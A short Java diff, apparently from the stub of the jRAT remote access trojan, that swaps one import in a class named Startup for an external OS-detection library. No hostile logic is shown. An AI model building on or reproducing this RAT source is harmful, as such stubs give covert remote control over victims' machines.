@@ -4,8 +4,9 @@ import java.io.File;
 import java.io.FileWriter;
 import java.io.PrintWriter;
 
-import se.jrat.common.OperatingSystem;
 import se.jrat.stub.utils.Utils;
+
+import com.redpois0n.oslib.OperatingSystem;
 
 
 public class Startup {
